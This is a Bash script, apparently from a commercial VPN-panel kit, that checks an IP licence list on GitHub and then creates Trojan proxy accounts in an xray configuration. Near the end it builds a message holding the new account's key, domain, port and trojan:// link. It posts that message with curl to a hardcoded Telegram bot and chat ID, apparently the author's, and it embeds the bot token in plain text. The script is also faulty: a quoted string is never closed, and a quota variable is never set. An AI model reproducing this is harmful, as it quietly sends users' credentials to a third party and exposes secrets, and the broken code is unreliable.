#!/bin/bash
# My Telegram : https://t.me/anuybazoelk
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Getting
export CHATID="1328284490"
export KEY="8068817658:AAFg9G7lJq7UMoF94EN8ihraoT5DQaJgbfw"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
MYIP=$(wget -qO- icanhazip.com);
IZIN=$( curl https://mrtunneldo2024.github.io/ip | grep $MYIP )
echo "Memeriksa Hak Akses VPS..."
if [ $MYIP = $IZIN ]; then
echo -e "${NC}${GREEN}Permission Accepted...${NC}"
else
echo -e "${NC}${RED}Permission Denied!${NC}";
echo -e "${NC}${LIGHT}Please Contact Admin!!"
echo -e "${NC}${LIGHT}Facebook	: https://m.facebook.com/Anuybazoelk639"
echo -e "${NC}${LIGHT}WhatsApp	: https://wa.me/6285349326511"
echo -e "${NC}${LIGHT}WhatsApp	: https://wa.me/6287728411949"
echo -e "${NC}${LIGHT}Youtube	: youtube.com/@anuy63"
echo -e "${NC}${LIGHT}Telegram	: https://t.me/anuybazoelk"
echo -e "${NC}${LIGHT}Telegram	: https;//t.me/anuybazoelk639"
exit 0
fi
clear
echo "Checking VPS"
clear
uuid=$(cat /etc/xray/uuid.txt)
source /var/lib/bztunnelling/ipvps.conf
if [[ "$IP" = "" ]]; then
domain=$(cat /etc/xray/domain)
else
domain=$IP
fi
tr="$(cat ~/log-install.txt | grep -w "Trojan" | cut -d: -f2|sed 's/ //g')"
until [[ $user =~ ^[a-zA-Z0-9_]+$ && ${user_EXISTS} == '0' ]]; do
		read -rp "Password : " -e user
		user_EXISTS=$(grep -w $user /etc/xray/config.json | wc -l)

		if [[ ${user_EXISTS} == '1' ]]; then
			echo ""
			echo -e "Username ${RED}${user}${NC} Already On VPS Please Choose Another"
			exit 1
		fi
	done
read -p "Expired (Days) : " masaaktif
hariini=`date -d "0 days" +"%Y-%m-%d"`
exp=`date -d "$masaaktif days" +"%Y-%m-%d"`
sed -i '/#xray-trojan$/a\#&# '"$user $exp"'\
},{"password": "'""$user""'","email": "'""$user""'"' /etc/xray/config.json
systemctl restart xray.service
trojanlink="trojan://${user}@${domain}:${tr}"
service cron restart
clear
c=$(echo "${Quota}" | sed 's/[^0-9]*//g')
d=$((${c} * 1024 * 1024 * 1024))

if [[ ${c} != "0" ]]; then
  echo "${d}" >/etc/xray/${user}
fi
DATADB=$(cat /etc/xray/.xray.db | grep "^###" | grep -w "${user}" | awk '{print $2}')
if [[ "${DATADB}" != '' ]]; then
  sed -i "/\b${user}\b/d" /etc/xray/.xray.db
fi
echo "### ${user} ${exp} ${uuid}" >>/etc/xray/.xray.db
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="<code>====================</code>
<code>TROJAN TCP</code>
<code>====================</code>
<code>Remarks	: ${user}
Address    : ${domain}
Port       : ${tr}
Key        : ${user}
Name      : TROJAN TCP</code>
<code>====================</code>
<code>TROJAN TCP</code>
<code>====================</code>
<code>${trojanlink}</code>
<code>====================</code>
Dibuat Pada    : $hariini
Berakhir Pada  : $exp
whatsapp	: wa.me/6287728411949
Telegram	: t.me/anuybazoelk
<code>====================</code>

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "=======-TROJAN TCP-======="
echo -e "Remarks  : ${user} "
echo -e "IP/Host  : ${MYIP} "
echo -e "Address  : ${domain} "
echo -e "Port     : ${tr} "
echo -e "Key      : ${user} "
echo -e "Created  : $hariini "
echo -e "Expired  : $exp "
echo -e "========================="
echo -e "Link Trojan TCP	: ${trojanlink} "
echo -e "========================="
echo -e "whatsapp	: wa.me/6287728411949 "
echo -e "Telegram	: t.me/anuybazoelk "
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
echo -e ""
echo -e "Script By BZ TUNNELLING"
echo -e ""
